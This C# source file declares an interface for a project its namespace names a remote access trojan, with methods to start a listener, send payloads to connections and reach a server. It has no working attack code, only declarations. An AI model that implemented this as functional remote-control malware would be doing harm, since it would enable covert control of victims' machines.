using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Company.Tools.RemoteAccessTrojan.Domain.Models;

namespace Company.Tools.RemoteAccessTrojan.Application
{
    public interface IApplicationService
    {
        Listener StartListener();
        void StopListener(Listener listener);
        string SendPayload(Listener listener, Guid connectionIdentifier, string request);
        void ReachServer();
    }
}